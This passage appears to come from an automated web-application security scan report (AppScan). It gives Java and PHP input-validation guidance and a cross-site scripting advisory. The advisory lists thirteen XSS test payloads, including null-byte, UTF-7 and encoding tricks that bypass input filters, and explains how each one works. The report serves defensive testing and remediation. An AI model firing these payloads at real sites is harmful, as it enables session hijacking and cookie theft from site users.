  // Check if there were any validation errors
  Errors errors = (Errors)request.getAttribute("errors");
  if (errors != null &amp;&amp; errors.hasErrors()) {
      // iterate through errors and output error messages corresponding to the "user_name" property
      ArrayList userNameErrors = errors.getErrors("user_name");
      ListIterator iterator = userNameErrors.iterator();
      while (iterator.hasNext()) {
          // Get the next error object
          Error error = (Error)iterator.next();
          String errorMessage = ErrorMessageResource.getErrorMessage(error.getKey(), userLocale);
          output.write(errorMessage + "\r\n");
      }
  }
</code>
              <br />
              <br />
              <text>It is recommended to define a custom JSP tag, e.g. displayErrors, to iterate through and render error messages as shown in the above example.</text>
              <br />
              <br />
              <text>[4] Error Mapping</text>
              <br />
              <text>Normally, the Servlet Container will return a default error page corresponding to either the response status code or the exception.  A mapping between the status code or the exception and a web resource may be specified using custom error pages.  It is a good practice to develop static error pages that do not disclose internal error states (by default, most Servlet containers will report internal error messages).  This mapping is configured in the Web Deployment Descriptor (web.xml) as specified in the following example:</text>
              <br />
              <br />
              <code>  &lt;!-- Mapping of HTTP error codes and application exceptions to error pages --&gt;
  &lt;error-page&gt;
    &lt;exception-type&gt;UserValidationException&lt;/exception-type&gt;
    &lt;location&gt;/errors/validationError.html&lt;/error-page&gt;
  &lt;/error-page&gt;
  &lt;error-page&gt;
    &lt;error-code&gt;500&lt;/exception-type&gt;
    &lt;location&gt;/errors/internalError.html&lt;/error-page&gt;
  &lt;/error-page&gt;
  &lt;error-page&gt;
  ...
  &lt;/error-page&gt;
  ...
</code>
              <br />
              <br />
              <br />
              <text>RECOMMENDED JAVA TOOLS</text>
              <br />
              <text>The two main Java frameworks for server-side validation are:</text>
              <br />
              <text>[1] Jakarta Commons Validator (integrated with Struts 1.1)</text>
              <br />
              <text>The Jakarta Commons Validator is a Java framework that defines the error handling mechanism as described above.  Validation rules are configured in an XML file that defines input validation rules for form fields and the corresponding validation error keys.  Struts provides internationalization support to build localized applications using resource bundles and message formatting.</text>
              <br />
              <br />
              <text>Example to validate the userName field of a loginForm using Struts Validator:</text>
              <br />
              <code>  &lt;form-validation&gt;
      &lt;global&gt;
          ...
          &lt;validator name="required"
              classname="org.apache.struts.validator.FieldChecks"
              method="validateRequired"
              msg="errors.required"&gt;
          &lt;/validator&gt;
          &lt;validator name="mask"
              classname="org.apache.struts.validator.FieldChecks"
              method="validateMask"
              msg="errors.invalid"&gt;
          &lt;/validator&gt;
          ...
      &lt;/global&gt;
      &lt;formset&gt;
          &lt;form name="loginForm"&gt;
              &lt;!-- userName is required and is alpha-numeric case insensitive --&gt;
              &lt;field property="userName" depends="required,mask"&gt;
                  &lt;!-- message resource key to display if validation fails --&gt;
                  &lt;msg name="mask" key="login.userName.maskmsg"/&gt;
                  &lt;arg0 key="login.userName.displayname"/&gt;
                  &lt;var&gt;
                      &lt;var-name&gt;mask&lt;/var-name&gt;
                      &lt;var-value&gt;^[a-zA-Z0-9]*$&lt;/var-value&gt;
                  &lt;/var&gt;
              &lt;/field&gt;
          ...
          &lt;/form&gt;
          ...
      &lt;/formset&gt;
  &lt;/form-validation&gt;
</code>
              <br />
              <br />
              <text>The Struts JSP tag library defines the "errors" tag that conditionally displays a set of accumulated error messages as shown in the following example:</text>
              <br />
              <br />
              <code>  &lt;%@ page language="java" %&gt;
  &lt;%@ taglib uri="/WEB-INF/struts-html.tld" prefix="html" %&gt;
  &lt;%@ taglib uri="/WEB-INF/struts-bean.tld" prefix="bean" %&gt;
  &lt;html:html&gt;
  &lt;head&gt;
  &lt;body&gt;
      &lt;html:form action="/logon.do"&gt;    
      &lt;table border="0" width="100%"&gt;
      &lt;tr&gt;
          &lt;th align="right"&gt;
              &lt;html:errors property="username"/&gt;
              &lt;bean:message key="prompt.username"/&gt;
          &lt;/th&gt;
          &lt;td align="left"&gt;
              &lt;html:text property="username" size="16"/&gt;
          &lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
      &lt;td align="right"&gt;
          &lt;html:submit&gt;&lt;bean:message key="button.submit"/&gt;&lt;/html:submit&gt;
      &lt;/td&gt;
      &lt;td align="right"&gt;
          &lt;html:reset&gt;&lt;bean:message key="button.reset"/&gt;&lt;/html:reset&gt;
      &lt;/td&gt;
      &lt;/tr&gt;
      &lt;/table&gt;
      &lt;/html:form&gt;
  &lt;/body&gt;
  &lt;/html:html&gt;
</code>
              <br />
              <br />
              <text>[2] JavaServer Faces Technology</text>
              <br />
              <text>JavaServer Faces Technology is a set of Java APIs (JSR 127) to represent UI components, manage their state, handle events, validate input, and support internationalization.</text>
              <br />
              <br />
              <text>The JavaServer Faces API defines the "output_errors" UIOutput Renderer, which displays error messages for an entire page or error messages associated with a specified client identifier.</text>
              <br />
              <br />
              <text>Example to validate the userName field of a loginForm using JavaServer Faces:</text>
              <br />
              <code>  &lt;%@ taglib uri="http://java.sun.com/jsf/html" prefix="h" %&gt;
  &lt;%@ taglib uri="http://java.sun.com/jsf/core" prefix="f" %&gt;
  ...
  &lt;jsp:useBean id="UserBean"
      class="myApplication.UserBean" scope="session" /&gt;
  &lt;f:use_faces&gt;
    &lt;h:form formName="loginForm" &gt;
      &lt;h:input_text id="userName" size="20" modelReference="UserBean.userName"&gt;
          &lt;f:validate_required/&gt;
          &lt;f:validate_length minimum="8" maximum="20"/&gt;    
      &lt;/h:input_text&gt;
      &lt;!-- display errors if present --&gt;
      &lt;h:output_errors id="loginErrors" clientId="userName"/&gt;
      &lt;h:command_button id="submit" label="Submit" commandName="submit" /&gt;&lt;p&gt;
    &lt;/h:form&gt;
  &lt;/f:use_faces&gt;
</code>
              <br />
              <br />
              <text>REFERENCES</text>
              <br />
              <text>Java API 1.3 - </text>
              <link target="http://java.sun.com/j2se/1.3/docs/api/">http://java.sun.com/j2se/1.3/docs/api/</link>
              <br />
              <text>Java API 1.4 - </text>
              <link target="http://java.sun.com/j2se/1.4/docs/api/">http://java.sun.com/j2se/1.4/docs/api/</link>
              <br />
              <text>Java Servlet API 2.3 - </text>
              <link target="http://java.sun.com/products/servlet/2.3/javadoc/">http://java.sun.com/products/servlet/2.3/javadoc/</link>
              <br />
              <text>Java Regular Expression Package - </text>
              <link target="http://jakarta.apache.org/regexp/">http://jakarta.apache.org/regexp/</link>
              <br />
              <text>Jakarta Validator - </text>
              <link target="http://jakarta.apache.org/commons/validator/">http://jakarta.apache.org/commons/validator/</link>
              <br />
              <text>JavaServer Faces Technology - </text>
              <link target="http://java.sun.com/j2ee/javaserverfaces/">http://java.sun.com/j2ee/javaserverfaces/</link>
            </fixRecommendation>
            <fixRecommendation type="PHP">
              <text>** Filter User Input</text>
              <br />
              <br />
              <text>Before passing any data to a SQL query, it should always be properly filtered with whitelisting techniques.  This cannot be over-emphasized.  Filtering user input will correct many injection flaws before they arrive at the database.</text>
              <br />
              <br />
              <text>** Quote User Input</text>
              <br />
              <br />
              <text>Regardless of data type, it is always a good idea to place single quotes around all user data if this is permitted by the database.  MySQL allows this formatting technique.</text>
              <br />
              <br />
              <text>** Escape the Data Values</text>
              <br />
              <br />
              <text>If you're using MySQL 4.3.0 or newer, you should escape all strings with mysql_real_escape_string().  If you are using an older version of MySQL, you should use the mysql_escape_string() function.  If you are not using MySQL, you might choose to use the specific escaping function for your particular database.  If you are not aware of an escaping function, you might choose to utilize a more generic escaping function such as addslashes().</text>
              <br />
              <br />
              <text>If you're using the PEAR DB database abstraction layer, you can use the DB::quote() method or use a query placeholder like ?, which automatically escapes the value that replaces the placeholder.</text>
              <br />
              <br />
              <text>REFERENCES</text>
              <br />
              <text>
              </text>
              <link target="http://ca3.php.net/mysql_real_escape_string">http://ca3.php.net/mysql_real_escape_string</link>
              <br />
              <text>
              </text>
              <link target="http://ca.php.net/mysql_escape_string">http://ca.php.net/mysql_escape_string</link>
              <br />
              <text>
              </text>
              <link target="http://ca.php.net/addslashes">http://ca.php.net/addslashes</link>
              <br />
              <text>
              </text>
              <link target="http://pear.php.net/package-info.php?package=DB">http://pear.php.net/package-info.php?package=DB</link>
              <br />
              <br />
              <br />
              <text>** Input Data Validation:</text>
              <br />
              <br />
              <text>While data validations may be provided as a user convenience on the client-tier, data validation must always be performed on the server-tier.  Client-side validations are inherently insecure because they can be easily bypassed, e.g. by disabling Javascript.</text>
              <br />
              <br />
              <text>A good design usually requires the web application framework to provide server-side utility routines to validate the following:</text>
              <br />
              <text>[1] Required field</text>
              <br />
              <text>[2] Field data type (all HTTP request parameters are Strings by default)</text>
              <br />
              <text>[3] Field length</text>
              <br />
              <text>[4] Field range</text>
              <br />
              <text>[5] Field options</text>
              <br />
              <text>[6] Field pattern</text>
              <br />
              <text>[7] Cookie values</text>
              <br />
              <text>[8] HTTP Response</text>
              <br />
              <br />
              <text>A good practice is to implement a function or functions that validates each application parameter.  The following sections describe some example checking.</text>
              <br />
              <br />
              <text>[1] Required field</text>
              <br />
              <text>Always check that the field is not null and its length is greater than zero, excluding leading and trailing white spaces.</text>
              <br />
              <br />
              <text>Example of how to validate required fields:</text>
              <br />
              <br />
              <code>  // PHP example to validate required fields
  function validateRequired($input) {
      ...
      $pass = false;
      if (strlen(trim($input))&gt;0){
          $pass = true;
      }
      return $pass;
      ...
  }
  ...
  if (validateRequired($fieldName)) {
      // fieldName is valid, continue processing request
      ...
  }
</code>
              <br />
              <br />
              <br />
              <text>[2] Field data type</text>
              <br />
              <text>In web applications, input parameters are poorly typed.  For example, all HTTP request parameters or cookie values are of type String.  The developer is responsible for verifying the input is of the correct data type.</text>
              <br />
              <br />
              <text>[3] Field length</text>
              <br />
              <text>Always ensure that the input parameter (whether HTTP request parameter or cookie value) is bounded by a minimum length and/or a maximum length.</text>
              <br />
              <br />
              <text>[4] Field range</text>
              <br />
              <text>Always ensure that the input parameter is within a range as defined by the functional requirements.</text>
              <br />
              <br />
              <text>[5] Field options</text>
              <br />
              <text>Often, the web application presents the user with a set of options to choose from, e.g. using the SELECT HTML tag, but fails to perform server-side validation to ensure that the selected value is one of the allowed options.  Remember that a malicious user can easily modify any option value.  Always validate the selected user value against the allowed options as defined by the functional requirements.</text>
              <br />
              <br />
              <text>[6] Field pattern</text>
              <br />
              <text>Always check that user input matches a pattern as defined by the functionality requirements.  For example, if the userName field should only allow alpha-numeric characters, case insensitive, then use the following regular expression:</text>
              <br />
              <text>^[a-zA-Z0-9]+$</text>
              <br />
              <br />
              <text>[7] Cookie value</text>
              <br />
              <text>The same validation rules (described above) apply to cookie values depending on the application requirements, e.g. validate a required value, validate length, etc.</text>
              <br />
              <br />
              <text>[8] HTTP Response</text>
              <br />
              <br />
              <text>[8-1] Filter user input</text>
              <br />
              <text>To guard the application against cross-site scripting, the developer should sanitize HTML by converting sensitive characters to their corresponding character entities.  These are the HTML sensitive characters:</text>
              <br />
              <text>&lt; &gt; " ' % ; ) ( &amp; +</text>
              <br />
              <br />
              <text>PHP includes some automatic sanitation utility functions, such as htmlentities():</text>
              <br />
              <br />
              <code>  $input = htmlentities($input, ENT_QUOTES, 'UTF-8');
</code>
              <br />
              <br />
              <text>In addition, in order to avoid UTF-7 variants of Cross-site Scripting, you should explicitly define the Content-Type header of the response, for example:</text>
              <br />
              <br />
              <code>  &lt;?php
  header('Content-Type: text/html; charset=UTF-8');
  ?&gt;
</code>
              <br />
              <br />
              <text>[8-2] Secure the cookie</text>
              <br />
              <br />
              <text>When storing sensitive data in a cookie and transporting it over SSL, make sure that you first set the secure flag of the cookie in the HTTP response. This will instruct the browser to only use that cookie over SSL connections.</text>
              <br />
              <br />
              <text>You can use the following code example, for securing the cookie:</text>
              <br />
              <br />
              <code>  &lt;$php
      $value = "some_value";
      $time = time()+3600;
      $path = "/application/";
      $domain = ".example.com";
      $secure = 1;
      setcookie("CookieName", $value, $time, $path, $domain, $secure, TRUE);
  ?&gt;
</code>
              <br />
              <br />
              <text>In addition, we recommend that you use the HttpOnly flag. When the HttpOnly flag is set to TRUE the cookie will be made accessible only through the HTTP protocol. This means that the cookie won't be accessible by scripting languages, such as JavaScript. This setting can effectly help to reduce identity theft through XSS attacks (although it is not supported by all browsers).</text>
              <br />
              <br />
              <text>The HttpOnly flag was Added in PHP 5.2.0.</text>
              <br />
              <br />
              <text>REFERENCES</text>
              <br />
              <br />
              <text>[1] Mitigating Cross-site Scripting With HTTP-only Cookies: </text>
              <link target="http://msdn2.microsoft.com/en-us/library/ms533046.aspx">http://msdn2.microsoft.com/en-us/library/ms533046.aspx</link>
              <br />
              <text>[2] PHP Security Consortium: </text>
              <link target="http://phpsec.org/">http://phpsec.org/</link>
              <br />
              <text>[3] PHP &amp; Web Application Security Blog (Chris Shiflett): </text>
              <link target="http://shiflett.org/">http://shiflett.org/</link>
            </fixRecommendation>
          </fixRecommendations>
        </advisory>
        <Severity>High</Severity>
        <EntityType>Parameter</EntityType>
        <Invasive>False</Invasive>
      </IssueType>
      <IssueType ID="attCrossSiteScripting" Count="5">
        <RemediationID>fix_52000</RemediationID>
        <advisory>
          <name>Cross-Site Scripting</name>
          <testDescription>Application-level test</testDescription>
          <threatClassification>
            <name>Client-side Attacks: Cross-site Scripting</name>
            <reference>http://www.webappsec.org/projects/threat/classes/cross-site_scripting.shtml</reference>
          </threatClassification>
          <testTechnicalDescription>
            <text>The Cross-Site Scripting attack is a privacy violation, that allows an attacker to acquire a legitimate user's credentials and to impersonate that user when interacting with a specific website. </text>
            <br />
            <br />
            <text>The attack hinges on the fact that the web site contains a script that returns a user's input (usually a parameter value) in an HTML page, without first sanitizing the input. This allows an input consisting of JavaScript code to be executed by the browser when the script returns this input in the response page. As a result, it is possible to form links to the site where one of the parameters consists of malicious JavaScript code. This code will be executed (by a user's browser) in the site context, granting it access to cookies that the user has for the site, and other windows in the site through the user's browser.</text>
            <br />
            <text>The attack proceeds as follows: The attacker lures the legitimate user to click on a link that was produced by the attacker. When the user clicks on the link, this generates a request to the web-site containing a parameter value with malicious JavaScript code. If the web-site embeds this parameter value into the response HTML page (this is the essence of the site issue), the malicious code will run in the user's browser.</text>
            <br />
            <br />
            <text>Possible actions that can be performed by the script are:</text>
            <br />
            <text>[1] Send user's cookies (for the legitimate site) to the attacker.</text>
            <br />
            <text>[2] Send information that is accessible through the DOM (URLs, Form fields, etc.), to the attacker.</text>
            <br />
            <text>The result is that the security and privacy of the victim user is compromised on the vulnerable site.</text>
            <br />
            <br />
            <text>Some notes:</text>
            <br />
            <text>[1] Although the attacked web site is involved, it is not compromised directly. It is used as a 'jump station' for the malicious script sent by the attacker, to return to the victim's browser, as if it is legitimate. However, since the privacy of the victim is breached in the context of the specific site, and since the site is directly responsible, it is considered a security flaw in the site.</text>
            <br />
            <text>[2] The malicious link can be provided by the attacker, using a web site link, if the attacker maintains a site that is visited by the victim user. The malicious link can also be provided by email, if the attacker knows the user's email address, and the user's email client uses the browser to render the HTML message.</text>
            <br />
            <text>[3] While user input is most commonly found in form field values (i.e. URL parameters), there are known attacks where the malicious code is embedded in the path, query, or in the HTTP Referrer headers, and even in cookies.</text>
            <br />
            <text>[4] AppScan sends many types of Cross-Site Scripting attacks, including attacks that work only on specific browsers or versions of browsers. AppScan's "Show in Browser" feature uses Internet Explorer to show the vulnerability. In the case of variants to which Internet Explorer is not vulnerable, but other browsers are, the "Show in Browser" facility does not work and the popup is not shown. </text>
            <br />
            <br />
            <text>There are two possible scenarios for sending input to a web application that is vulnerable to cross-site scripting: </text>
            <br />
            <text>A. The parameter value sent to the CGI script is returned in the response page, embedded in the HTML.</text>
            <br />
            <text>For example:</text>
            <br />
            <br />
            <text>[request]</text>
            <br />
            <text>GET /cgi-bin/script.pl?name=JSmith HTTP/1.0</text>
            <br />
            <br />
            <text>[response]</text>
            <br />
            <text>HTTP/1.1 200 OK</text>
            <br />
            <text>Server: SomeServer</text>
            <br />
            <text>Date: Sun, 01 Jan 2002 00:31:19 GMT</text>
            <br />
            <text>Content-Type: text/html</text>
            <br />
            <text>Accept-Ranges: bytes</text>
            <br />
            <text>Content-Length: 27</text>
            <br />
            <br />
            <text>&lt;HTML&gt;</text>
            <br />
            <text>Hello JSmith</text>
            <br />
            <text>&lt;/HTML&gt;</text>
            <br />
            <br />
            <text>B. The parameter value sent to the CGI script is returned in an HTML parameter value context.</text>
            <br />
            <text>For example:</text>
            <br />
            <br />
            <text>[request]</text>
            <br />
            <text>GET /cgi-bin/script.pl?name=JSmith HTTP/1.0</text>
            <br />
            <br />
            <text>[response]</text>
            <br />
            <text>HTTP/1.1 200 OK</text>
            <br />
            <text>Server: SomeServer</text>
            <br />
            <text>Date: Sun, 01 Jan 2002 00:31:19 GMT</text>
            <br />
            <text>Content-Type: text/html</text>
            <br />
            <text>Accept-Ranges: bytes</text>
            <br />
            <text>Content-Length: 254</text>
            <br />
            <br />
            <text>&lt;HTML&gt;</text>
            <br />
            <text>Please fill in your zip code:</text>
            <br />
            <text>&lt;FORM METHOD=GET ACTION="/cgi-bin/script.pl"&gt;</text>
            <br />
            <text>&lt;INPUT TYPE=text NAME="name" value="JSmith"&gt; &lt;br&gt;</text>
            <br />
            <text>&lt;INPUT TYPE=text NAME="zip"  value="Enter zip code here"&gt; &lt;br&gt;</text>
            <br />
            <text>&lt;INPUT TYPE=submit value="Submit"&gt;</text>
            <br />
            <text>&lt;/FORM&gt;</text>
            <br />
            <text>&lt;/HTML&gt;</text>
            <br />
            <br />
            <text>Example 1 - scenario A</text>
            <br />
            <text>The following request is sent by the user:</text>
            <br />
            <br />
            <text>[attack request]</text>
            <br />
            <text>GET /cgi-bin/script.pl?name=&gt;"'&gt;&lt;script&gt;alert('Watchfire%20XSS%20Test%20Successful')&lt;/script&gt; HTTP/1.0</text>
            <br />
            <br />
            <text>[attack response scenario A]</text>
            <br />
            <text>HTTP/1.1 200 OK</text>
            <br />
            <text>Server: SomeServer</text>
            <br />
            <text>Date: Sun, 01 Jan 2002 00:31:19 GMT</text>
            <br />
            <text>Content-Type: text/html</text>
            <br />
            <text>Accept-Ranges: bytes</text>
            <br />
            <text>Content-Length: 83</text>
            <br />
            <br />
            <text>&lt;HTML&gt;</text>
            <br />
            <text>Hello &gt;"'&gt;&lt;script&gt;alert('Watchfire XSS Test Successful')&lt;/script&gt;</text>
            <br />
            <text>&lt;/HTML&gt;</text>
            <br />
            <br />
            <text>In this case, the JavaScript code will be executed by the browser (The &gt;"'&gt; part is irrelevant here).</text>
            <br />
            <br />
            <text>Example 2 - scenario B</text>
            <br />
            <text>Using the same script and input as in Example 1 to invoke the attack:</text>
            <br />
            <br />
            <text>[attack response scenario B]</text>
            <br />
            <text>HTTP/1.1 200 OK</text>
            <br />
            <text>Server: SomeServer</text>
            <br />
            <text>Date: Sun, 01 Jan 2002 00:31:19 GMT</text>
            <br />
            <text>Content-Type: text/html</text>
            <br />
            <text>Accept-Ranges: bytes</text>
            <br />
            <text>Content-Length: 310</text>
            <br />
            <br />
            <text>&lt;HTML&gt;</text>
            <br />
            <text>Please fill in your zip code:</text>
            <br />
            <text>&lt;FORM METHOD=GET ACTION="/cgi-bin/script.pl"&gt;</text>
            <br />
            <text>&lt;INPUT TYPE=text NAME="name" value="&gt;"'&gt;&lt;script&gt;alert('Watchfire XSS Test Successful')&lt;/script&gt;"&gt; &lt;br&gt;</text>
            <br />
            <text>&lt;INPUT TYPE=text NAME="zip"  value="Enter zip code here"&gt; &lt;br&gt;</text>
            <br />
            <text>&lt;INPUT TYPE=submit value="Submit"&gt;</text>
            <br />
            <text>&lt;/FORM&gt;</text>
            <br />
            <text>&lt;/HTML&gt;</text>
            <br />
            <br />
            <text>The &gt;"'&gt; prefix is used to break out of the parameter value context. Closing the parameter value field ( "'&gt; ) and then closing the &lt;INPUT&gt; tag ( &gt; ) will cause the JavaScript to be executed by the browser and not to be treated as a parameter value that would have been parsed or executed as JavaScript code.</text>
            <br />
            <br />
            <text>Listed below are the different test variants:</text>
            <br />
            <br />
            <text>[1] &gt;'&gt;&lt;script&gt;alert('Watchfire XSS Test Successful')&lt;/script&gt;</text>
            <br />
            <text>[2] &gt;"&gt;&lt;script&gt;alert("Watchfire XSS Test Successful")&lt;/script&gt;</text>
            <br />
            <text>[3] &lt;/TextArea&gt;&lt;script&gt;alert('Watchfire XSS Test Successful')&lt;/script&gt;</text>
            <br />
            <text>[4] &gt;"'&gt;&lt;img src="javascript:alert('Watchfire XSS Test Successful')"&gt;</text>
            <br />
            <text>[5] &gt;"'&gt;&lt;img src=&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;alert(&amp;quot;Watchfire&amp;#x20;XSS&amp;#x20;Test&amp;#x20;Successful&amp;quot;)&gt;</text>
            <br />
            <text>[6] " style="background:url(javascript:alert('Watchfire XSS Test Successful'))" OA="</text>
            <br />
            <text>[7] --&gt;&lt;script&gt;alert('Watchfire XSS Test Successful')&lt;/script&gt;</text>
            <br />
            <text>[8] '+alert('Watchfire XSS Test Successful')+'</text>
            <br />
            <text>[9] "+alert('Watchfire XSS Test Successful')+"</text>
            <br />
            <text>[10] &gt;'&gt;&lt;%00script&gt;alert('Watchfire XSS Test Successful')&lt;/script&gt;   (.NET 1.1 specific variant)</text>
            <br />
            <text>[11] &gt;"&gt;&lt;%00script&gt;alert("Watchfire XSS Test Successful")&lt;/script&gt;   (.NET 1.1 specific variant)</text>
            <br />
            <text>[12] &gt;+ACI-+AD4-+ADw-SCRIPT+AD4-alert(1234)+ADw-/SCRIPT+AD4-</text>
            <br />
            <text>[13] %A7%A2%BE%Bc%F3%E3%F2%E9%F0%F4%Be%E1%Ec%E5%F2%F4%A8%A7Watchfire%20XSS%20Test%20Successful%A7%A9%Bc%Af%F3%E3%F2%E9%F0%F4%Be</text>
            <br />
            <br />
            <text>Variant details:</text>
            <br />
            <br />
            <text>Test variants [1] &amp; [2]: These are the most basic cross-site scripting variants. The difference between the two variants is the use of quotes or of an apostrophe in the JavaScript code. Some web application programmers only sanitize user input for apostrophe or for quotes, but not both. This vulnerability is detected by running both variants.</text>
            <br />
            <br />
            <text>Test variant [3]: This test variant is specifically designed for user input that is returned embedded in &lt;TEXTAREA&gt; parameters. During the test, an attempt is made to break out of the parameter value (text area), to force the JavaScript to be executed by the browser.</text>
            <br />
            <br />
            <text>Test variant [4]: Some web application programmers sanitize &lt;SCRIPT&gt; tags from user input, but forget to sanitize the "javascript:" specifier, which can be used in HTML links. During this test, an attempt is made to embed the malicious JavaScript code by using an &lt;img&gt; tag with a JavaScript link as its source.</text>
            <br />
            <br />
            <text>Test variant [5]: This variant is very similar to variant #4. It uses HTML entities to bypass security measures which sanitize user input of the &lt;, &gt;, quotes and the "javascript:" specifier. </text>
            <br />
            <br />
            <text>Test variant [6]: This variant uses the least number of non-standard characters. Unlike former variants, it does not use &amp;, &gt;, &lt; , # or ; characters. Assuming that the user input is embedded in an HTML form parameter value (inside an &lt;INPUT&gt; tag), the malicious string first escapes from parameter value context and then proceeds to add a STYLE attribute to the &lt;INPUT&gt; tag, in which it embeds the malicious JavaScript code. Note: this variant will only succeed in scenario B, or if user input is embedded in attributes of other HTML elements.</text>
            <br />
            <br />
            <text>Test variant [7]: Some web applications embed user input inside HTML comments. To test the application for this vulnerability, the HTML comment ( --&gt; ) is first closed, and then the malicious JavaScript code is embedded.</text>
            <br />
            <br />
            <text>Test variants [8] &amp; [9]: Some web applications embed user input in JavaScript string literals, for example:</text>
            <br />
            <text>&lt;HTML&gt;</text>
            <br />
            <text>&lt;SCRIPT LANGUAGE="JavaScript"&gt;</text>
            <br />
            <text>var str = 'Hello $user_input';</text>
            <br />
            <text>...</text>
            <br />
            <text>&lt;/SCRIPT&gt;</text>
            <br />
            <text>&lt;/HTML&gt;</text>
            <br />
            <br />
            <text>If we send the following parameter value: '+alert('Watchfire XSS Test Successful')+', the resulting response page will look like this:</text>
            <br />
            <text>&lt;HTML&gt;</text>
            <br />
            <text>&lt;SCRIPT LANGUAGE="JavaScript"&gt;</text>
            <br />
            <text>var str = 'Hello ' + alert('Watchfire XSS Test Successful') + '';</text>
            <br />
            <text>...</text>
            <br />
            <text>&lt;/SCRIPT&gt;</text>
            <br />
            <text>&lt;/HTML&gt;</text>
            <br />
            <br />
            <text>The application is tricked into concatenating the malicious JavaScript code in the middle of the original string literal, causing the browser to execute our JavaScript code. The difference between variants #8 and #9 is the use of quotes or of an apostrophe, which customizes the attack for both string-terminating characters.</text>
            <br />
            <br />
            <text>Test variants [10] &amp; [11]: In Microsoft .NET 1.1, the HttpRequest.ValidateInput method validates data submitted by a client browser and raises an exception if potentially dangerous data is present. </text>
            <br />
            <br />
            <text>From MSDN: "If the validation feature is enabled by page directive or configuration, this method is called during the Page's ProcessRequest processing phase. ValidateInput can be called by your code if the validation feature is not enabled. Request validation works by checking all input data against a hard-coded list of potentially dangerous data."</text>
            <br />
            <br />
            <text>Input data is checked during request validation in the following members: </text>
            <br />
            <text>- HttpRequest.Form, </text>
            <br />
            <text>- HttpRequest.QueryString, </text>
            <br />
            <text>- HttpRequest.Cookies </text>
            <br />
            <br />
            <text>** Note: The HttpRequest.ValidateInput is enabled by default in ASP.NET 1.1</text>
            <br />
            <br />
            <text>ASP.NET 1.1 blocks input containing '&lt;' followed by an alphanumeric character or an exclamation mark (e.g. &lt;script&gt; , &lt;img, &lt;!--, etc...)  If the '&lt;' character is followed first by a NULL byte and only then by an alphanumeric character, the pattern does not match and the input is allowed to reach the web application. For example:</text>
            <br />
            <br />
            <text>[*] The string '&lt;script&gt;' is blocked by ASP.NET 1.1</text>
            <br />
            <text>[*] The string '&lt;%00script&gt;' is allowed by ASP.NET 1.1</text>
            <br />
            <br />
            <text>In addition, the HTML parser of most web browsers (including all versions of Microsoft Internet Explorer), ignores the NULL byte, and parses &lt;%00script&gt; as &lt;script&gt;. When combining this with the security problem presented above, any HTML tag can be injected through ASP.NET 1.1 HttpRequest.ValidateInput security mechanism, leaving it vulnerable to cross site scripting, and injection of other malicious HTML tags.</text>
            <br />
            <br />
            <text>Test variant [12]: While many input validation functions properly filter out or escape common characters used for XSS (such as &lt;&gt; (triangular parenthesis)), only a few manage to handle hazardous UTF-7 encoded strings.</text>
            <br />
            <text>Therefore, in many cases, when sending an XSS attack payload encoded in UTF-7, the payload will return in the response without being altered.</text>
            <br />
            <text>For the attack to succeed, the victim's browser should treat the XSS payload as UTF-7, otherwise the script will not be executed.</text>
            <br />
            <text>If 'Encoding' is set to 'Auto-Detect', and Internet Explorer finds a UTF-7 string in the first 4096 characters of the response body, it will set the charset encoding to UTF-7 automatically, unless another charset encoding is already enforced. This automatic encoding feature may help a malicious user to mount the UTF-7 XSS attack.</text>
            <br />
            <br />
            <text>A successful attack for this variant requires the following:</text>
            <br />
            <text>[*] The victim uses an Internet Explorer client with 'Encoding' set to 'Auto-Detect'.</text>
            <br />
            <text>[*] There is no charset encoding enforcement (unless utf-7 is enforced) in:</text>
            <br />
            <text>[*] The response headers ("Content-Type: text/html; charset=[encoding]").</text>
            <br />
            <text>[*] A &lt;meta http-equiv="Content-Type" (...) charset=[encoding]/&gt; tag at the response html.</text>
            <br />
            <text>[*] The injected text appears in the first 4096 characters of the html text.</text>
            <br />
            <br />
            <text>Test variant [13]: The purpose of this variant is to exploit the way Internet-Explorer treats responses with 'us-ascii' Content-Type (it discards the Most Significant Bit of each character). </text>
            <br />
            <br />
            <text>By changing the most significant bit of each character of an XSS payload, AppScan can evade standard input sanitation functions.</text>
            <br />
            <br />
            <text>For example: %3C, which is the URL-encoded representation of "&lt;", is transformed into %BC in this attack. It is not recognized by the server-side sanitation function as a hazardous character, and therefore not altered in any way, but it will be read by Internet Explorer as "&lt;", making a Cross-Site Scripting attack possible.</text>
          </testTechnicalDescription>
          <causes>
            <cause>Sanitation of hazardous characters was not performed correctly on user input</cause>
          </causes>
          <securityRisks>
            <securityRisk>It is possible to steal or manipulate customer session and cookies, which might be used to impersonate a legitimate user, allowing the hacker to view or alter user records, and to perform transactions as that user</securityRisk>
          </securityRisks>
          <affectedProducts>
            <affectedProduct>This issue may affect different types of products.</affectedProduct>
          </affectedProducts>
          <references>
            <link target="http://www.cert.org/advisories/CA-2000-02.html">CERT Advisory CA-2000-02</link>
            <link target="http://support.microsoft.com/default.aspx?scid=kb;EN-US;q252985">Microsoft How To: Prevent Cross-Site Scripting Security Issues (Q252985)</link>
            <link target="http://msdn2.microsoft.com/en-us/library/ms998274.aspx">Microsoft How To: Prevent Cross-Site Scripting in ASP.NET</link>
            <link target="http://msdn2.microsoft.com/en-us/library/Bb355989.aspx">Microsoft How To: Protect From Injection Attacks in ASP.NET</link>
            <link target="http://msdn2.microsoft.com/en-us/library/ms998267.aspx">Microsoft How To: Use Regular Expressions to Constrain Input in ASP.NET</link>
            <link target="http://msdn2.microsoft.com/en-us/security/aa973814.aspx">Microsoft .NET Anti-Cross Site Scripting Library</link>
            <link target="http://download.boulder.ibm.com/ibmdl/pub/software/dw/richmedia/rational/08/appscan_demos/xss/viewer.swf#recorded_advisory">Cross-Site Scripting Training Module</link>
            <link target="http://cwe.mitre.org/cgi-bin/jumpmenu.cgi?id=79">CWE-79: Failure to Preserve Web Page Structure ('Cross-site Scripting')</link>
          </references>
          <fixRecommendations>
            <fixRecommendation type="General">
              <text>There are several issues whose remediation lies in sanitizing user input.</text>
              <br />
              <text>By verifying that user input does not contain hazardous characters, it is possible to prevent malicious users from causing your application to execute unintended operations, such as launch arbitrary SQL queries, embed Javascript code to be executed on the client side, run various operating system commands etc.</text>
              <br />
              <br />
              <text>It is advised to filter out all the following characters:</text>
              <br />
              <indentText>   [1] |  (pipe sign)</indentText>
              <indentText>   [2] &amp;  (ampersand sign)</indentText>
              <indentText>   [3] ;  (semicolon sign)</indentText>
              <indentText>   [4] $  (dollar sign)</indentText>
